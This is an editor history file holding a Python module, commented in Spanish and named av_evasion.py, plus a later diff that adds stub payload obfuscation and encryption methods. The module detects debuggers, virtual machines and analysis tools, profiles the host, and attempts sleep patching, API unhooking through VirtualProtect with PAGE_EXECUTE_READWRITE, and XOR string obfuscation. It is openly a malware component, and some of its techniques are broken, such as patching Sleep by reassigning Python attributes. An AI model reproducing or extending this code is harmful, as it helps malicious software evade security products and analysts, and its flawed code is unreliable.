{
    "sourceFile": "src/modules/av_evasion.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 1,
            "patches": [
                {
                    "date": 1740262396682,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740266541697,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,8 +1,6 @@\n \"\"\"\r\n-Módulo de evasión de antivirus.\r\n-Implementa técnicas para evadir detección por software de seguridad\r\n-y proporciona mecanismos de ofuscación y anti-análisis.\r\n+Módulo para técnicas de evasión de antivirus\r\n \"\"\"\r\n \r\n import ctypes\r\n import os\r\n@@ -28,8 +26,9 @@\n         ]\r\n         self.virtualization_artifacts = [\r\n             \"vbox\", \"vmware\", \"qemu\", \"virtual\", \"sandbox\", \"sample\"\r\n         ]\r\n+        self.techniques = []\r\n         \r\n     def check_environment(self) -> Dict[str, Any]:\r\n         \"\"\"\r\n         Realiza comprobaciones del entorno para detectar análisis.\r\n@@ -288,4 +287,12 @@\n                 \r\n             return True\r\n         except:\r\n             return False\r\n+\r\n+    def obfuscate_payload(self, payload):\r\n+        \"\"\"Ofusca un payload\"\"\"\r\n+        pass\r\n+        \r\n+    def encrypt_payload(self, payload):\r\n+        \"\"\"Encripta un payload\"\"\"\r\n+        pass\r\n"
                }
            ],
            "date": 1740262396682,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de evasión de antivirus.\r\nImplementa técnicas para evadir detección por software de seguridad\r\ny proporciona mecanismos de ofuscación y anti-análisis.\r\n\"\"\"\r\n\r\nimport ctypes\r\nimport os\r\nimport sys\r\nimport platform\r\nimport time\r\nimport random\r\nimport string\r\nimport subprocess\r\nimport psutil\r\nimport winreg\r\nimport socket\r\nfrom typing import List, Dict, Any, Optional\r\nimport logging\r\n\r\nclass AVEvasion:\r\n    def __init__(self):\r\n        \"\"\"Inicializa el módulo de evasión.\"\"\"\r\n        self.suspicious_processes = [\r\n            \"procmon\", \"wireshark\", \"fiddler\", \"processexplorer\", \r\n            \"processhacker\", \"ida\", \"ollydbg\", \"x32dbg\", \"x64dbg\",\r\n            \"pestudio\", \"regshot\", \"autoruns\", \"tcpview\", \"vmtoolsd\"\r\n        ]\r\n        self.virtualization_artifacts = [\r\n            \"vbox\", \"vmware\", \"qemu\", \"virtual\", \"sandbox\", \"sample\"\r\n        ]\r\n        \r\n    def check_environment(self) -> Dict[str, Any]:\r\n        \"\"\"\r\n        Realiza comprobaciones del entorno para detectar análisis.\r\n        \r\n        Returns:\r\n            dict: Resultado de las comprobaciones ambientales\r\n        \"\"\"\r\n        results = {\r\n            \"is_analyzed\": False,\r\n            \"detected_artifacts\": [],\r\n            \"environment_info\": {}\r\n        }\r\n        \r\n        try:\r\n            # Comprobar procesos sospechosos\r\n            if self._check_suspicious_processes():\r\n                results[\"is_analyzed\"] = True\r\n                results[\"detected_artifacts\"].append(\"análisis_procesos\")\r\n            \r\n            # Comprobar virtualización\r\n            if self._check_virtualization():\r\n                results[\"is_analyzed\"] = True\r\n                results[\"detected_artifacts\"].append(\"entorno_virtual\")\r\n            \r\n            # Comprobar debugger\r\n            if self._check_debugger():\r\n                results[\"is_analyzed\"] = True\r\n                results[\"detected_artifacts\"].append(\"debugger\")\r\n            \r\n            # Recopilar información del entorno\r\n            results[\"environment_info\"] = self._gather_environment_info()\r\n            \r\n        except Exception as e:\r\n            results[\"error\"] = str(e)\r\n            \r\n        return results\r\n\r\n    def _check_suspicious_processes(self) -> bool:\r\n        \"\"\"Comprueba procesos de análisis conocidos.\"\"\"\r\n        try:\r\n            for proc in psutil.process_iter(['name']):\r\n                process_name = proc.info['name'].lower()\r\n                if any(suspicious in process_name for suspicious in self.suspicious_processes):\r\n                    return True\r\n            return False\r\n        except:\r\n            return False\r\n\r\n    def _check_virtualization(self) -> bool:\r\n        \"\"\"Detecta entornos virtualizados.\"\"\"\r\n        try:\r\n            # Comprobar nombre de máquina\r\n            hostname = platform.node().lower()\r\n            if any(artifact in hostname for artifact in self.virtualization_artifacts):\r\n                return True\r\n            \r\n            # Comprobar servicios de VM\r\n            if platform.system() == \"Windows\":\r\n                services = subprocess.check_output(\"sc query\", shell=True).decode().lower()\r\n                if any(artifact in services for artifact in [\"vmtools\", \"vboxservice\"]):\r\n                    return True\r\n                    \r\n            # Comprobar MAC address\r\n            for nic in psutil.net_if_addrs().values():\r\n                for addr in nic:\r\n                    if addr.address.startswith((\"08:00:27\", \"00:0C:29\", \"00:50:56\")):\r\n                        return True\r\n                        \r\n            return False\r\n        except:\r\n            return False\r\n\r\n    def _check_debugger(self) -> bool:\r\n        \"\"\"Detecta la presencia de un debugger.\"\"\"\r\n        try:\r\n            if platform.system() == \"Windows\":\r\n                return bool(ctypes.windll.kernel32.IsDebuggerPresent())\r\n            return False\r\n        except:\r\n            return False\r\n\r\n    def _gather_environment_info(self) -> Dict[str, Any]:\r\n        \"\"\"Recopila información detallada del entorno.\"\"\"\r\n        try:\r\n            return {\r\n                \"hostname\": platform.node(),\r\n                \"os\": platform.system(),\r\n                \"cpu_count\": psutil.cpu_count(),\r\n                \"memory\": psutil.virtual_memory().total,\r\n                \"disk_size\": psutil.disk_usage('/').total,\r\n                \"username\": os.getlogin(),\r\n                \"domain\": socket.getfqdn()\r\n            }\r\n        except:\r\n            return {}\r\n\r\n    def apply_evasion_techniques(self) -> Dict[str, bool]:\r\n        \"\"\"\r\n        Aplica técnicas de evasión básicas.\r\n        \r\n        Returns:\r\n            dict: Resultado de las técnicas aplicadas\r\n        \"\"\"\r\n        results = {\r\n            \"sleep_patching\": False,\r\n            \"api_unhooking\": False,\r\n            \"memory_cleaning\": False,\r\n            \"strings_obfuscation\": False\r\n        }\r\n        \r\n        try:\r\n            # Parchear funciones de sleep\r\n            if self._patch_sleep_functions():\r\n                results[\"sleep_patching\"] = True\r\n            \r\n            # Desanclar APIs\r\n            if self._unhook_apis():\r\n                results[\"api_unhooking\"] = True\r\n            \r\n            # Limpiar memoria\r\n            if self._clean_process_memory():\r\n                results[\"memory_cleaning\"] = True\r\n            \r\n            # Ofuscar strings\r\n            if self._obfuscate_strings():\r\n                results[\"strings_obfuscation\"] = True\r\n                \r\n        except Exception as e:\r\n            results[\"error\"] = str(e)\r\n            \r\n        return results\r\n\r\n    def _patch_sleep_functions(self) -> bool:\r\n        \"\"\"Parchea funciones de sleep para evadir análisis basado en tiempo.\"\"\"\r\n        try:\r\n            if platform.system() == \"Windows\":\r\n                # Obtener handle de kernel32\r\n                kernel32 = ctypes.WinDLL('kernel32')\r\n                \r\n                # Crear función alternativa de sleep\r\n                def new_sleep(ms):\r\n                    pass\r\n                \r\n                # Parchear Sleep y SleepEx\r\n                kernel32.Sleep = new_sleep\r\n                kernel32.SleepEx = new_sleep\r\n                \r\n            return True\r\n        except:\r\n            return False\r\n\r\n    def _unhook_apis(self) -> bool:\r\n        \"\"\"Desancla APIs monitorizadas.\"\"\"\r\n        try:\r\n            if platform.system() == \"Windows\":\r\n                # Lista de DLLs comunes\r\n                dlls = [\"ntdll.dll\", \"kernel32.dll\", \"user32.dll\"]\r\n                \r\n                for dll in dlls:\r\n                    # Cargar copia limpia de la DLL\r\n                    clean_dll = ctypes.WinDLL(dll)\r\n                    \r\n                    # Obtener funciones exportadas\r\n                    exports = self._get_dll_exports(dll)\r\n                    \r\n                    # Restaurar funciones originales\r\n                    for export in exports:\r\n                        try:\r\n                            orig_addr = getattr(clean_dll, export)\r\n                            self._write_memory(export, orig_addr)\r\n                        except:\r\n                            continue\r\n                            \r\n            return True\r\n        except:\r\n            return False\r\n\r\n    def _clean_process_memory(self) -> bool:\r\n        \"\"\"Limpia strings y artifacts de la memoria del proceso.\"\"\"\r\n        try:\r\n            # Forzar recolección de basura\r\n            import gc\r\n            gc.collect()\r\n            \r\n            # Limpiar variables temporales\r\n            locals().clear()\r\n            \r\n            # Sobrescribir memoria no utilizada\r\n            temp = \"A\" * 1024 * 1024\r\n            del temp\r\n            \r\n            return True\r\n        except:\r\n            return False\r\n\r\n    def _obfuscate_strings(self) -> bool:\r\n        \"\"\"Ofusca strings en memoria.\"\"\"\r\n        try:\r\n            # Generar clave aleatoria\r\n            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))\r\n            \r\n            # Función de ofuscación XOR\r\n            def xor_string(text: str, key: str) -> str:\r\n                return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))\r\n            \r\n            # Ofuscar strings importantes\r\n            self.suspicious_processes = [xor_string(proc, key) for proc in self.suspicious_processes]\r\n            self.virtualization_artifacts = [xor_string(art, key) for art in self.virtualization_artifacts]\r\n            \r\n            return True\r\n        except:\r\n            return False\r\n\r\n    @staticmethod\r\n    def _get_dll_exports(dll_name: str) -> List[str]:\r\n        \"\"\"Obtiene la lista de funciones exportadas de una DLL.\"\"\"\r\n        try:\r\n            result = subprocess.check_output(f\"dumpbin /exports {dll_name}\", shell=True)\r\n            exports = []\r\n            for line in result.decode().splitlines():\r\n                if \"ordinal hint\" in line.lower():\r\n                    continue\r\n                parts = line.split()\r\n                if len(parts) >= 4:\r\n                    exports.append(parts[3])\r\n            return exports\r\n        except:\r\n            return []\r\n\r\n    @staticmethod\r\n    def _write_memory(address: int, data: bytes) -> bool:\r\n        \"\"\"Escribe datos en una dirección de memoria.\"\"\"\r\n        try:\r\n            if platform.system() == \"Windows\":\r\n                kernel32 = ctypes.WinDLL('kernel32')\r\n                \r\n                # Cambiar protección de memoria\r\n                old_protect = ctypes.c_ulong(0)\r\n                kernel32.VirtualProtect(\r\n                    ctypes.c_void_p(address),\r\n                    len(data),\r\n                    0x40,  # PAGE_EXECUTE_READWRITE\r\n                    ctypes.byref(old_protect)\r\n                )\r\n                \r\n                # Escribir datos\r\n                ctypes.memmove(address, data, len(data))\r\n                \r\n                # Restaurar protección\r\n                kernel32.VirtualProtect(\r\n                    ctypes.c_void_p(address),\r\n                    len(data),\r\n                    old_protect,\r\n                    ctypes.byref(old_protect)\r\n                )\r\n                \r\n            return True\r\n        except:\r\n            return False\r\n"
        }
    ]
}